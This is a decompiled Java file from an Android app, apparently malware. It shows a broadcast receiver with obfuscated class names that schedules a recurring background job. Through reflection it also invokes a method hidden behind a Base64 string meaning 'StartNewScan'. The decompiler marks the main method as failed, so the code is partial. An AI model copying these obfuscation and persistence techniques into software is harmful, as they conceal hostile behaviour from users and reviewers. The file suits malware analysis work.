package com.appser;

import android.app.job.JobInfo;
import android.app.job.JobScheduler;
import android.content.BroadcastReceiver;
import android.content.ComponentName;
import android.content.Context;
import android.os.Build;

public class advertisementmownershipcisoddirectivegbulletemanagementcchemicalsminstantxcounterhexecutex3 extends BroadcastReceiver {
    public static void scheduleJob(Context context) {
        JobInfo jobInfo;
        JobScheduler jobScheduler = (JobScheduler) context.getSystemService("jobscheduler");
        ComponentName componentName = new ComponentName(context, WackMeUpJob.class);
        if (Build.VERSION.SDK_INT >= 24) {
            jobInfo = new JobInfo.Builder(100, componentName).setPeriodic(900000).build();
        } else {
            jobInfo = new JobInfo.Builder(100, componentName).setPeriodic(15000).build();
        }
        jobScheduler.schedule(jobInfo);
    }

    /* JADX WARNING: Can't wrap try/catch for region: R(14:3|4|5|6|9|10|13|14|15|16|17|18|19|21) */
    /* JADX WARNING: Code restructure failed: missing block: B:22:?, code lost:
        return;
     */
    /* JADX WARNING: Failed to process nested try/catch */
    /* JADX WARNING: Missing exception handler attribute for start block: B:18:0x0038 */
    /* JADX WARNING: No exception handlers in catch block: Catch:{  } */
    /* JADX WARNING: Removed duplicated region for block: B:20:? A[ExcHandler: Exception (unused java.lang.Exception), SYNTHETIC, Splitter:B:18:0x0038] */
    /* Code decompiled incorrectly, please refer to instructions dump. */
    public void onReceive(android.content.Context r9, android.content.Intent r10) {
        /*
            r8 = this;
            scheduleJob(r9)     // Catch:{  }
            java.lang.Class<com.appser.advertisementmownershipcisoddirectivegbulletemanagementcchemicalsminstantxcounterhexecutex31> r10 = com.appser.advertisementmownershipcisoddirectivegbulletemanagementcchemicalsminstantxcounterhexecutex31.class
            boolean r10 = com.appser.advertisementmownershipcisoddirectivegbulletemanagementcchemicalsminstantxcounterhexecutex30.segavsphereksaturnbsusedcognitiveoplacinggviewsvruntimerbrazilianmgenderesslhfouldhelpsrperspectivesz49(r10, r9)     // Catch:{  }
            if (r10 == 0) goto L_0x0041
            android.content.Intent r10 = new android.content.Intent     // Catch:{  }
            java.lang.Class<com.appser.advertisementmownershipcisoddirectivegbulletemanagementcchemicalsminstantxcounterhexecutex31> r0 = com.appser.advertisementmownershipcisoddirectivegbulletemanagementcchemicalsminstantxcounterhexecutex31.class
            r10.<init>(r9, r0)     // Catch:{  }
            java.lang.String r0 = "com.appser.safarivreaderstrailsoincomingabreathnmailmanssettledccompetingjhintsoeffectivelyxicsftteenagex5"
            r1 = 0
            java.lang.Class r0 = java.lang.Class.forName(r0)     // Catch:{ ClassNotFoundException -> 0x001a }
            goto L_0x001b
        L_0x001a:
            r0 = r1
        L_0x001b:
            java.lang.Object r2 = r0.newInstance()     // Catch:{ IllegalAccessException | InstantiationException -> 0x0020 }
            goto L_0x0021
        L_0x0020:
            r2 = r1
        L_0x0021:
            r3 = 2
            java.lang.Class[] r4 = new java.lang.Class[r3]     // Catch:{  }
            java.lang.Class<android.content.Context> r5 = android.content.Context.class
            r6 = 0
            r4[r6] = r5     // Catch:{  }
            java.lang.Class<android.content.Intent> r5 = android.content.Intent.class
            r7 = 1
            r4[r7] = r5     // Catch:{  }
            java.lang.String r5 = "U3RhcnROZXdTY2Fu"
            java.lang.String r5 = com.appser.safarivreaderstrailsoincomingabreathnmailmanssettledccompetingjhintsoeffectivelyxicsftteenagex5.raisefmicemmexicoxwordpressggraphicyropexrestorationsjessicaiallahgthreadedjtexasrsocksjknowsf40(r5)     // Catch:{  }
            java.lang.reflect.Method r1 = r0.getDeclaredMethod(r5, r4)     // Catch:{ NoSuchMethodException -> 0x0038 }
        L_0x0038:
            java.lang.Object[] r0 = new java.lang.Object[r3]     // Catch:{ Exception -> 0x0041, Exception -> 0x0041 }
            r0[r6] = r9     // Catch:{ Exception -> 0x0041, Exception -> 0x0041 }
            r0[r7] = r10     // Catch:{ Exception -> 0x0041, Exception -> 0x0041 }
            r1.invoke(r2, r0)     // Catch:{ Exception -> 0x0041, Exception -> 0x0041 }
        L_0x0041:
            return
        */
        throw new UnsupportedOperationException("Method not decompiled: com.appser.advertisementmownershipcisoddirectivegbulletemanagementcchemicalsminstantxcounterhexecutex3.onReceive(android.content.Context, android.content.Intent):void");
    }
}
